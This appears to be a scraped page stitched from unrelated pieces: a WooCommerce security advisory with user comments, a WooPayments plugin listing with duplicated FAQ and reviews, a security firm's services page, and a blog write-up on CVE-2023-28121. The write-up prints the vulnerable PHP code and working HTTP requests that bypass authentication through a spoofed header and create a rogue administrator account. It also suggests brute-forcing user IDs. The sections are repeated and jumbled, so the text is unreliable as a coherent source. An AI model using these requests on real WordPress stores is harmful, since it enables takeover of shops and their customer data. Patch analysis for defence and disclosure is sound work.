[![WordPress GiveWP POP to RCE (CVE-2024-5932)](https://www.rcesecurity.com/wp-content/uploads/2024/08/cve-2024-5932-0.png)](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, August 26, 2024 | [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

A few days ago, Wordfence published a blog post about a PHP Object Injection vulnerability affecting the popular WordPress Plugin GiveWP in all versions <= 3.14.1. Since the blog post contains only information about (a part) of the POP chain used, I decided to take a look and build a fully functional Remote Code Execution exploit. This post describes how I approached the process, identifying the missing parts and building the entire POP chain.

# Critical Vulnerability Patched in WooCommerce Payments – What You Need to Know (Sept 2023 Update)

[Developer Advisories](https://developer.woocommerce.com/category/developer-advisories/)

***September 6, 2023 UPDATE***

During the week of September 4, 2023, Woo began proactively contacting merchants via email who may still be using vulnerable versions of **WooPayments**. These emails to merchants are an important step to make sure that merchants have all the information needed to check their current version of WooPayments and carry out critical updates.

Since this original post, **WooCommerce Payments** has been renamed **WooPayments;** however, all steps and information in this post remain accurate.

If you received an email from Woo encouraging you to update WooPayments, please review the information in this post. Check the current version of WooPayments (or WooCommerce Payments) installed on your shop and update immediately if your version is out of date.

If you have questions, reply to that email or [open a support ticket.](https://woocommerce.com/my-account/contact-support/)

On March 22, 2023, a vulnerability was discovered within [WooCommerce Payments](https://woocommerce.com/payments/) (also known as WooPayments) that, if exploited, could permit unauthorized admin access to impacted stores. We immediately deactivated the impacted services and mitigated the issue for all websites hosted on WordPress.com, Pressable, and WPVIP.

The vulnerability was reported by Michael Mazzolini of [GoldNetwork](https://www.gold-network.ch), who was conducting white-hat testing for us through our HackerOne program. As soon as the vulnerability was reported, we began an investigation to ascertain whether any data had been exposed or if the vulnerability had been exploited. We currently have no evidence of the vulnerability being used outside of our own security testing program. We shipped a fix and worked with the WordPress.org Plugins Team to auto-update sites running WooCommerce Payments 4.8.0 through 5.6.1 to patched versions. The update is currently being automatically rolled out to as many stores as possible.

Because this vulnerability also had the potential to impact [WooPay](https://woocommerce.com/woopay/), a new payment checkout service in beta testing, we have temporarily disabled the beta program.

**I have WooCommerce Payments (or WooPayments) installed. What actions do I need to take?**
If your website is hosted on WordPress.com, your store is in the process of being updated or has already been updated to remove the vulnerability.

All websites with WooCommerce Payments 4.8.0 and higher installed and activated on their site, that are not hosted on WordPress.com and which have not updated to a patched version (see below), are still potentially vulnerable to this issue. Here’s how to make sure you have the latest version:​​

1. From your WP Admin dashboard, click the *Plugins* menu item and look for ***WooCommerce Payments*** *(or WooPayments)* in your list of plugins.
2. The version number should be displayed in the *Description* column next to the plugin name. If this number matches any of the patched versions listed below, **no further action is needed**.
3. If a new version is available for download, you should see a notice guiding you to **update WooCommerce Payments** *(or WooPayments)* — please go ahead and do so.

Once you’re running a secure version, we recommend checking for any unexpected admin users or posts on your site. **If you find any evidence of unexpected activity**, we suggest:

1. [Updating the passwords](https://wordpress.org/documentation/article/reset-your-password/) for any Admin users on your site, especially if they reuse the same passwords on multiple websites.
2. Rotating any API keys used on your site, including the WooCommerce API keys used on your site. [Here’s how to update your WooCommerce API keys.](https://woocommerce.com/document/woocommerce-rest-api/#section-2) For resetting other keys, please consult the documentation for those specific plugins or services.

**How do I know if my version is up-to-date?**Below you can find the full list of patched versions of WooCommerce Payments. If you are running a version of WooCommerce Payments that is not on this list, please update to one of these versions immediately.

| **Patched WooCommerce Payments (WooPayments)** **Versions** |
| --- |
| 4.8.2 |
| 4.9.1 |
| 5.0.4 |
| 5.1.3 |
| 5.2.2 |
| 5.3.1 |
| 5.4.1 |
| 5.5.2 |
| 5.6.2 |
| 5.7.0 |
| 6.2.2 |
| 6.3.0 |
| 6.3.2 |
| 6.4.0 |

*(updated September 6, 2023)*

**Has my data been compromised?**
At this time we have no evidence that the vulnerability was exploited beyond identifying it in our own security testing program. We will continue to investigate, and if we discover any new information we will update this post.

**Which passwords do I need to change?**
It’s unlikely that your password was compromised as it is [hashed](https://en.wikipedia.org/wiki/Cryptographic_hash_function).

WordPress user passwords are hashed using salts, which means the resulting hash value is very difficult to crack. This salted hash approach protects your password as an admin user, and also the passwords of any other users on your site, including customers. While it is possible the hashed version of your password stored in your database may have been accessed through this vulnerability, the hash value should be indiscernible and still protect your passwords from unauthorized use.

Note that our guidance on passwords assumes that your site is using the standard WordPress password management for users. Depending on the plugins you’ve installed on your site you may have passwords or other sensitive information stored in less secure ways.

If any of the Administrator users on your site might have reused the same passwords on multiple websites, we recommend you [update those passwords](https://wordpress.org/documentation/article/reset-your-password/) in case their credentials have been compromised elsewhere.

We also recommend changing any private or secret data stored in your WordPress/WooCommerce database. This may include API keys, public/private keys for payment gateways, and more, depending on your particular store configuration. [Here’s how to update your WooCommerce API key.](https://woocommerce.com/document/woocommerce-rest-api/#section-2) For resetting other keys, please consult the documentation for those specific plugins.

**I’m a service provider, developer, or agency. Should I alert my WooCommerce merchants?**
We encourage anyone who supports or develops for other WooCommerce merchants to share this information and to make sure that their clients who have WooCommerce Payments installed are using the most updated version of WooCommerce Payments.

**I’m a merchant. Do I need to contact my customers?**
We do not believe any store or customer data was compromised as a result of this vulnerability. If we have any reason to think this is not the case, we will contact you via email directly.

**Is WooCommerce still safe to use?**
Yes. Identifying a new vulnerability is uncommon, however it still can arise sometimes. When it does, we work diligently to track and patch any vulnerabilities as quickly as possible. And we strive to investigate, act, and communicate with our merchants and customers as quickly as possible.

**I have other questions.**
If you have any further concerns or questions regarding this issue, our team of Happiness Engineers is on hand to help – [open a support ticket](https://woocommerce.com/my-account/contact-support/).

***March 27, 2023 UPDATE***
Since posting about the WooCommerce Payments vulnerability last week, we have been in touch with a few customers who have reported potential exploits to their WooCommerce stores. We’re investigating each of those reports to better understand what has taken place, and we’re working directly with impacted customers to help them secure their shops.

We continue to encourage you to reach out and open a ticket with [Woo’s support team](https://woocommerce.com/my-account/contact-support/) if you believe your store was impacted.

   The advisory above uses the language of uncertainty, “*could* permit unauthorized admin access” and “*potentially* vulnerable to this issue”.

      Our number one priority during this incident has been to limit impacts to vulnerable stores. Once a patch is live, it’s a race against time to use every tool at our disposal to quickly get vulnerable stores updated before bad actors attempt exploits. We aimed to clearly communicate the severity of the issue and the need to update immediately, while avoiding sharing specifics that could even slightly aid or motivate the efforts of bad actors. This is certainly a balancing act, and we truly appreciate your feedback on this and the fact that you are taking this incident so seriously.

   Could this vulnerability have given a bad actor the chance to infect a person’s computer with, say, the Trojan:Script “Wacatac’ – if they happened to be logged into WordPress and the storefront to update products during the same time period?

      We’re not aware of any method of exploiting this vulnerability that would allow an attacker to install trojans or any other malware on a personal computer.

   Thank you for the quick information. Currently I have version 5.6.2 and should be safe according to the table. How do I get the information turned off at wordpress? The constantly comes back and takes almost everything in “New products”.

   Hi, is it possible to remove completely the vulnerability alert? I’ve updated the plugin, but the alert is still displaying…

   Hi,

   Has a CVE ID been issued for this yet? Given that HackerOne is a CNA and Automattic owns WPScan which is also a CNA, we didn’t want to issue a CVE ID since we didn’t originally discover this issue and it wasn’t reported to us, but we’ve been getting questions about whether or not a CVE ID has been assigned.

   I’m also affected, that’s a complete mess. Access to the unique admin account on website have been changed and I just received a notice from my VPS provider that said port 25 will be blocked on my whole server due to exceed amount of mails being sent (probably throught the hacked website we have).

   I believe this was used for RCE on our website. Two admin accounts were created and then shortly after an upload script appeared in the root directory, from there they took the site entirely. There’s obviously an escalation chain here.

   Perhaps a silly question but if I have 5.7.0, do I need to go back down to 5.6.2? I just went to edit my site, and my screen said “Fatal Error” so I panicked, went into recovery mode, saw the WooPayments notice, and before reading anything I absentmindedly hit “update.” I’m not even sure if that was what was causing the fatal error because I still have two errors on my home page saying something about “line 67 in woocommerce quick view pro.” But that’s neither here nor there – am I ok with 5.7.0?

    Would this vulnerability allow someone to completely corrupt all website pages and the WordPress back end deeming it unusable. We have had this occur and have been told it is due to this plugin. Our online store took 75 hours to fix.

## FAQ

### What countries and currencies are supported?

If you are an individual or business based in [one of these countries](https://woocommerce.com/document/woopayments/compatibility/countries/#supported-countries), you can sign-up with WooPayments. After completing sign up, you can accept payments from customers anywhere in the world, as long as they are paying with [a supported currency](https://woocommerce.com/document/woopayments/currencies/available-currencies/).

We are actively planning to expand into additional countries based on your interest. Let us know where you would like to [see WooPayments launch next](https://woocommerce.com/payments/#request-invite).

### Why is a WordPress.com account and connection required?

WooPayments uses the WordPress.com connection to securely communicate with our payments server. This is necessary for WooPayments to function correctly, so it’s not possible to use WooPayments without connecting. Please see [this document](https://woocommerce.com/document/woopayments/our-policies/connection/) for more information.

Note that you do not need to host your site itself on WordPress.com, nor do you need to host *any* site on WordPress.com at all. You only need an account.

Note that you do not need to host your site itself on WordPress.com. You only need an account on WordPress.com to establish the connection. You can create a WordPress.com account [at this link](https://wordpress.com/start/account/user-social).

### How do I set up a store for a client?

If you are a developer or agency setting up a site for a client, please see [this page](https://woocommerce.com/document/woopayments/account-management/developer-or-agency-setup/) of our documentation for some tips on how to install WooPayments on client sites.

### How is WooPayments related to Stripe?

WooPayments is built in partnership with Stripe [Stripe](https://stripe.com/). When you sign up for WooPayments, your personal and business information is verified with Stripe and stored in an account connected to the WooPayments service. This account is then used in the background for managing your business account information and activity via WooPayments. [Learn more](https://woocommerce.com/document/woopayments/account-management/partnership-with-stripe/).

Installed when my site went live to test and removed it for something better. Years later when monitoring connections to my site I was continually seeing inbound requests from Wordpress servers trying to access my site via rest api and xmlrpc endpoints “both of which are disabled”. Further examination and support about these requests, I find out this is Jetpack plugin “which I have never installed”, has registered itself with my site, had generated itself a valid rest token to make connection with my site and it trying to connect using built in rest endpoints cleverly hidden into this plugin and Woocommerce. Even with the plugin removed pretty much right after it was installed, Jetpack was still trying to connect to my instance and gather data years later. Example endpoint it is trying to hit rest\_route=/jetpack/v4/connection/data&\_for=jetpack There is no mention on their plugin page about this plugin registering itself with Jetpack and what data it is harvesting and at no time did I ever authorize Jetpack to connect to my site. Luckily I had the endpoints it was trying to connect to blocked. The fact that it has been continually trying to connect years down and never unregistered itself when the plugin was uninstalled is a significant security issue.

I signed up for WooPayments expecting daily payouts as promised, but that’s not what happened. They withheld payouts and blamed it on “internal protocols” without clear communication or transparency. This wasn’t disclosed upfront, and their vague explanations feel murky at best. If I’d known this earlier, I would’ve gone with a different provider. I’m looking to switch to another payment gateway and sharing my experience so others don’t make the same mistake.

I do not recommend this service at all. They close your account suddenly without trying to communicate with you and without giving you a reason. This service is very bad. Check reviews, they suspend frequently.

This plugin caused nothing but conflicts on my site and then to ice the cake, they force you to take a survey to deactivate it and the survey is coded so poorly that if you skip a part that is required it breaks the whole page and you can’t deactivate at all. Horrible plugin that caused nothing but headaches in my checkout flow and severely hurt site performance even with the resources of a dedicated server. If you like how granular fraud protection is in stripe you can forget about it with this plugin. The interface is terrible – I like being able to go into stripe and get the full picture on questionable transactions and this gateway makes it impossible to observe the same level of detail. I thoroughly regret trying this plugin and I lost quite a few orders trying to figure it out. Thanks for the headaches I didn’t need.

## Description

**Payments made simple, with no monthly fees – designed exclusively for WooCommerce stores.**

Securely accept major credit and debit cards, and allow customers to pay you directly without leaving your WooCommerce store. View and manage transactions from one convenient place – your WordPress dashboard.

See payments, track cash flow into your bank account, manage refunds, and stay on top of disputes without the hassle of having to log into a separate payment processor.

**Manage transactions from the comfort of your store**

Features previously only available on your payment provider’s website are now part of your store’s **integrated payments dashboard**. This enables you to:

* View the details of [payments, refunds, and other transactions](https://woocommerce.com/document/woopayments/managing-money/).
* View and respond to [disputes and chargebacks](https://woocommerce.com/document/woopayments/fraud-and-disputes/managing-disputes/).
* [Track payouts](https://woocommerce.com/document/woopayments/payouts/) into your bank account or debit card.

**Pay as you go**

WooPayments is **free to install**, with **no setup fees or monthly fees**. Pay-as-you-go fees start at 2.9% + $0.30 per transaction for U.S.-issued cards. [Read more about transaction fees](https://woocommerce.com/document/woopayments/fees-and-debits/fees/).

**Supported by the WooCommerce team**

Our global support team is available to answer questions you may have about WooPayments installation, setup, or use. For assistance, [open a ticket on woocommerce.com](https://woocommerce.com/my-account/create-a-ticket/?select=5278104).

### Getting Started

#### Requirements

* WordPress 6.0 or newer.
* WooCommerce 7.6 or newer.
* PHP 7.3 or newer is recommended.

#### Try it now

To try WooPayments (previously WooCommerce Payments) on your store, simply [install it](https://wordpress.org/plugins/woocommerce-payments/#installation) and follow the prompts. Please see our [Startup Guide](https://woocommerce.com/document/woopayments/startup-guide/) for a full walkthrough of the process.

## Blocks

This plugin provides 1 block.

* Multi Currency Switcher

## Installation

Install and activate the WooCommerce and WooPayments plugins, if you haven’t already done so, then go to “Payments” in the WordPress admin menu and follow the instructions there.

## FAQ

### What countries and currencies are supported?

If you are an individual or business based in [one of these countries](https://woocommerce.com/document/woopayments/compatibility/countries/#supported-countries), you can sign-up with WooPayments. After completing sign up, you can accept payments from customers anywhere in the world.

We are actively planning to expand into additional countries based on your interest. Let us know where you would like to [see WooPayments launch next](https://woocommerce.com/payments/#request-invite).

### Why is a WordPress.com account and connection required?

WooPayments uses the WordPress.com connection to authenticate each request, connecting your store with our payments partner.

### How do I set up a store for a client?

If you are a developer or agency setting up a site for a client, please see [this page](https://woocommerce.com/document/woopayments/account-management/developer-or-agency-setup/) of our documentation for some tips on how to install WooPayments on client sites.

### How is WooPayments related to Stripe?

WooPayments is built in partnership with Stripe [Stripe](https://stripe.com/). When you sign up for WooPayments, your personal and business information is verified with Stripe and stored in an account connected to the WooPayments service. This account is then used in the background for managing your business account information and activity via WooPayments. [Learn more](https://woocommerce.com/document/woopayments/account-management/partnership-with-stripe/).

### Are there Terms of Service and data usage policies?

You can read our Terms of Service and other policies [here](https://woocommerce.com/document/woopayments/our-policies/).

### How does the Checkout block work?

You need the [WooCommerce Blocks](https://wordpress.org/plugins/woo-gutenberg-products-block/) plugin to be installed and active to use the Checkout block. Once you add the block to a page, WooPayments will automatically appear as an option.

Please note that our support for the checkout block is still experimental and the following features of the gateway will probably not work:

* Using saved cards and saving cards.
* Integration with WooCommerce Subscriptions.

Installed when my site went live to test and removed it for something better. Years later when monitoring connections to my site I was continually seeing inbound requests from Wordpress servers trying to access my site via rest api and xmlrpc endpoints “both of which are disabled”. Further examination and support about these requests, I find out this is Jetpack plugin “which I have never installed”, has registered itself with my site, had generated itself a valid rest token to make connection with my site and it trying to connect using built in rest endpoints cleverly hidden into this plugin and Woocommerce. Even with the plugin removed pretty much right after it was installed, Jetpack was still trying to connect to my instance and gather data years later. Example endpoint it is trying to hit rest\_route=/jetpack/v4/connection/data&\_for=jetpack There is no mention on their plugin page about this plugin registering itself with Jetpack and what data it is harvesting and at no time did I ever authorize Jetpack to connect to my site. Luckily I had the endpoints it was trying to connect to blocked. The fact that it has been continually trying to connect years down and never unregistered itself when the plugin was uninstalled is a significant security issue.

I signed up for WooPayments expecting daily payouts as promised, but that’s not what happened. They withheld payouts and blamed it on “internal protocols” without clear communication or transparency. This wasn’t disclosed upfront, and their vague explanations feel murky at best. If I’d known this earlier, I would’ve gone with a different provider. I’m looking to switch to another payment gateway and sharing my experience so others don’t make the same mistake.

I do not recommend this service at all. They close your account suddenly without trying to communicate with you and without giving you a reason. This service is very bad. Check reviews, they suspend frequently.

This plugin caused nothing but conflicts on my site and then to ice the cake, they force you to take a survey to deactivate it and the survey is coded so poorly that if you skip a part that is required it breaks the whole page and you can’t deactivate at all. Horrible plugin that caused nothing but headaches in my checkout flow and severely hurt site performance even with the resources of a dedicated server. If you like how granular fraud protection is in stripe you can forget about it with this plugin. The interface is terrible – I like being able to go into stripe and get the full picture on questionable transactions and this gateway makes it impossible to observe the same level of detail. I thoroughly regret trying this plugin and I lost quite a few orders trying to figure it out. Thanks for the headaches I didn’t need.

# Services

We’re currently offering the following consulting services:

## Penetration Tests

A penetration test, or pen test, is a security assessment that involves simulating attacks on a computer system, network, or application. We attempt to identify vulnerabilities and weaknesses in the target system by using the same techniques and tools as potential malicious actors. The objective is to uncover and address security risks before they can be exploited, helping organizations enhance their cybersecurity defenses and protect against real threats. Penetration tests are a proactive measure to ensure the robustness of digital assets and data security.

We perform penetration tests against all kinds of targets:

* Web applications with any tech stack
* Web service APIs – i.e., GraphQl, Rest, SOAP
* Android mobile apps
* iOS mobile apps

## Bug Bounty Services

Empower your organization’s cybersecurity with a tailored Bug Bounty Program. Take control of your digital defense by engaging a community of ethical hackers to proactively identify vulnerabilities. Running your own Bug Bounty Program enhances your security posture and demonstrates a commitment to staying ahead in the ever-evolving landscape of cyber threats.

Do you want to run your own vulnerability disclosure or bug bounty program? Or do you already operate one but are not happy with how it is managed? Do you want to have independent triage?

What we do:

* Setting up vulnerability disclosure and bug bounty programs
* Managing new and existing programs
* Triaging incoming bug bounty reports

## Source Code Reviews

A security source code review, also known as a code audit or static code analysis, is a meticulous examination of the software’s source code to identify and rectify security vulnerabilities and flaws. This in-depth analysis is crucial for ensuring that software applications are robust and resistant to potential cyber threats, as it enables developers and security experts to spot and mitigate security issues before they can be exploited by malicious actors.

We perform source code reviews of applications based on the following languages:

* Java
* PHP
* .NET

## Attack Surface Management

Attack Surface Management is a security practice focused on identifying, monitoring, and reducing digital vulnerabilities and potential points of attack within an organization’s IT environment. It involves a comprehensive assessment of the organization’s assets, including applications, networks, and data, to determine where and how malicious actors might exploit weaknesses. By actively managing and minimizing the attack surface, organizations can strengthen their security posture, reduce risks, and safeguard their systems and data from potential cyber threats.

What we do:

* Continuous monitoring of any of your assets, including mobile apps.

[![WordPress GiveWP POP to RCE (CVE-2024-5932)](https://www.rcesecurity.com/wp-content/uploads/2024/08/cve-2024-5932-0.png)](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)
## [WordPress GiveWP POP to RCE (CVE-2024-5932)](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, August 26, 2024 | [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

A few days ago, Wordfence published a blog post about a PHP Object Injection vulnerability affecting the popular WordPress Plugin GiveWP in all versions <= 3.14.1. Since the blog post contains only information about (a part) of the POP chain used, I decided to take a look and build a fully functional Remote Code Execution exploit. This post describes how I approached the process, identifying the missing parts and building the entire POP chain.

# Patch Diffing CVE-2023-28121 to Compromise a WooCommerce

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, July 3, 2023 | [Exploit](https://www.rcesecurity.com/category/exploit/), [Patch Diffing](https://www.rcesecurity.com/category/patch-diffing/) | [0 comments](https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/#respond)

Back in March 2023, I noticed an interesting security advisory that [was published by Wordfence](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/woocommerce-payments/woocommerce-payments-561-authentication-bypass-and-privilege-escalation) about a critical “Authentication Bypass and Privilege Escalation” (aka [CVE-2023-28121](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-28121)) affecting the “WooCommerce Payments” plugin which has more than [600.000 active installs according to WordPress](https://wordpress.org/plugins/woocommerce-payments/).

Since one of my customers was running a WooCommerce instance with the vulnerable version of the plugin, but there wasn’t a publicly available PoC/exploit back then, I decided to look at it and build an exploit for it. It turns out that this vulnerability could give administrative rights to an attacker on a vulnerable WordPress/WooCommerce instance.

I’ve held back this blog post for a while due to the criticality of the bug, but since there are already some exploits floating around, I’ve decided to publish my post as well which focuses more on the root cause analysis.

Kudos to [Michael Mazzolini of GoldNetwork](https://www.gold-network.ch/) who seems to have originally found this bug.

## Patch Diffing All The Things

So when diffing the vulnerable version 5.6.1 (all below are vulnerable as well) and the fixed version 5.6.2, you can actually notice that there weren’t a lot of code changes at all.

![](https://www.rcesecurity.com/wp-content/uploads/2023/07/woocommerce-payments-auth-bypass-0-1024x272.png)

1. The developers removed a call to `Platform_Checkout_Session::init()` in `woocommerce-payments.php`:

![](https://www.rcesecurity.com/wp-content/uploads/2023/07/woocommerce-payments-auth-bypass-1-1024x412.png)

2. They entirely removed the `/includes/platform-checkout/class-platform-checkout-session.php` file, which happens to have the `Platform_Checkout_Session::init()` declaration inside of it.

Since it all comes down to the `init()` function, let’s quickly dive into that. Here’s the full source code which contains the vulnerability:

```
<?php
/**
 * Class WC_Payments_Session.
 *
 * @package WooCommerce\Payments
 */

namespace WCPay\Platform_Checkout;

/**
 * Class responsible for handling platform checkout sessions.
 * This class should be loaded as soon as possible so the correct session is loaded.
 * So don't load it in the WC_Payments::init() function.
 */
class Platform_Checkout_Session {

	const PLATFORM_CHECKOUT_SESSION_COOKIE_NAME = 'platform_checkout_session';

	/**
	 * Init the hooks.
	 *
	 * @return void
	 */
	public static function init() {
		add_filter( 'determine_current_user', [ __CLASS__, 'determine_current_user_for_platform_checkout' ] );
		add_filter( 'woocommerce_cookie', [ __CLASS__, 'determine_session_cookie_for_platform_checkout' ] );
	}

	/**
	 * Sets the current user as the user sent via the api from WooPay if present.
	 *
	 * @param \WP_User|null|int $user user to be used during the request.
	 *
	 * @return \WP_User|null|int
	 */
	public static function determine_current_user_for_platform_checkout( $user ) {
		if ( $user ) {
			return $user;
		}

		if ( ! isset( $_SERVER['HTTP_X_WCPAY_PLATFORM_CHECKOUT_USER'] ) || ! is_numeric( $_SERVER['HTTP_X_WCPAY_PLATFORM_CHECKOUT_USER'] ) ) {
			return null;
		}

		return (int) $_SERVER['HTTP_X_WCPAY_PLATFORM_CHECKOUT_USER'];
	}

	/**
	 * Tells WC to use platform checkout session cookie if the header is present.
	 *
	 * @param string $cookie_hash Default cookie hash.
	 *
	 * @return string
	 */
	public static function determine_session_cookie_for_platform_checkout( $cookie_hash ) {
		if ( isset( $_SERVER['HTTP_X_WCPAY_PLATFORM_CHECKOUT_USER'] ) && 0 === (int) $_SERVER['HTTP_X_WCPAY_PLATFORM_CHECKOUT_USER'] ) {
			return self::PLATFORM_CHECKOUT_SESSION_COOKIE_NAME;
		}

		return $cookie_hash;
	}
}

```

Yes, that’s it.

The `init()` function adds two WordPress filters whereof the `determine_current_user` is the most interesting one (line 25). When looking up the hook in [WordPress’s official documentation](https://developer.wordpress.org/reference/hooks/determine_current_user/), it becomes quite clear that it ultimately does what its name stands for: determining the current user.

All the (vulnerable) magic happens in the `determine_current_user_for_platform_checkout()` function (lines 36 to 46), where the plugin checks for the existence of the `X-WCPAY-PLATFORM-CHECKOUT-USER` request header and if it is present it simply returns the header’s value. Since the returned value represents the “determined” user, we can now trick WordPress into thinking that we’re correctly authenticated as the given userId.

## Triggering the Vulnerability

So to trigger the authentication bypass part, you just need to set the `X-WCPAY-PLATFORM-CHECKOUT-USER` request header and point it to a userId:

```
GET / HTTP/1.1
Host: 192.168.178.11
Upgrade-Insecure-Requests: 1
Connection: close
X-WCPAY-PLATFORM-CHECKOUT-USER: 1

```

When attaching a debugger and triggering the above request, you can notice that our initial theory is correct and that the `determine_current_user_for_platform_checkout()` function will simply return the userId from the request without any further validation:

![](https://www.rcesecurity.com/wp-content/uploads/2023/07/woocommerce-payments-auth-bypass-2-1024x330.png)

What happens under the hood is that the hook effectively tells WordPress which user the request came from. Since we have the userId under our control, we do now have an easy way to impersonate any user which is active/enabled on the WordPress instance, including administrators.

## Exploitation

Since we can impersonate administrative users, it is quite easy to compromise the entire WordPress instance. The easiest way I came up with is by utilizing WordPress’ `/wp-json/wp/v2/users` API interface, which allows adding new users.

Therefore the following request will add a new user called “hacked” with the default role of “administrator” to a vulnerable WordPress instance, by impersonating the user with the userId “1”, which is the first ever user (usually an administrator) added to any WordPress instance:

```
POST /wp-json/wp/v2/users HTTP/1.1
Host: 192.168.178.11
Upgrade-Insecure-Requests: 1
Connection: close
Content-Type: application/json
X-WCPAY-PLATFORM-CHECKOUT-USER: 1
Content-Length: 123

{
"username":"hacked",
"email":"[[email protected]](/cdn-cgi/l/email-protection)",
"password":"SuperSecure1337",
"roles":["administrator"]
}
```

Whether the exploit was successful can be determined based on the HTTP response code. If it is 201, the exploit was successful and it’ll return the user object of the newly created user:

![](https://www.rcesecurity.com/wp-content/uploads/2023/07/woocommerce-payments-auth-bypass-3-1024x785.png)

This can now be used to authenticate against WordPress’ administrative backend:

![](https://www.rcesecurity.com/wp-content/uploads/2023/07/woocommerce-payments-auth-bypass-4-1024x336.png)

In some cases, the targeted, impersonated user doesn’t exist anymore or is disabled. In this case, you need to either query the `/wp-json/wp/v2/users` API method to get a list of active users, or simply brute force through the userIds.

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, August 26, 2024 | [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

A few days ago, Wordfence published a blog post about a PHP Object Injection vulnerability affecting the popular WordPress Plugin GiveWP in all versions <= 3.14.1. Since the blog post contains only information about (a part) of the POP chain used, I decided to take a look and build a fully functional Remote Code Execution exploit. This post describes how I approached the process, identifying the missing parts and building the entire POP chain.

While my last finding affecting SecurePoint’s UTM was quite interesting already, I was hit by a really hard OpenSSL Heartbleed flashback with this one. The following exploit works against both the admin portal on port 11115 as well as the user portal on port...

While working on a recent customer engagement, I discovered two fascinating and somewhat weird bugs in SecurePoint’s UTM firewall solution. The first one, aka CVE-2023-22620, is rated critical for an attacker to bypass the entire authentication and gain access...
